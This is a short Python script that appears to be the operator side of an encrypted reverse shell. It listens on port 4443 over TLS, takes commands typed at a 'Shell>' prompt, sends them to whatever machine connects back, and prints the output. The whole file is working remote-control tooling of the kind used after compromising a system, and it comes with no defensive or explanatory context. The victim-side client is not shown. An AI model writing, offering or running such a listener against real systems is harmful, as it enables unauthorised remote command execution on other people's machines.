import socket
import ssl

HOST = '0.0.0.0'
PORT = 4443

context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")

with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
    sock.bind((HOST, PORT))
    sock.listen(5)
    print(f"[+] Listening on {HOST}:{PORT} ...")
    with context.wrap_socket(sock, server_side=True) as ssock:
        conn, addr = ssock.accept()
        print(f"[+] Connection from {addr}")
        while True:
            command = input("Shell> ")
            if command.lower() == 'exit':
                conn.sendall(b"exit")
                break
            conn.sendall(command.encode())
            data = conn.recv(4096).decode()
            print(data)
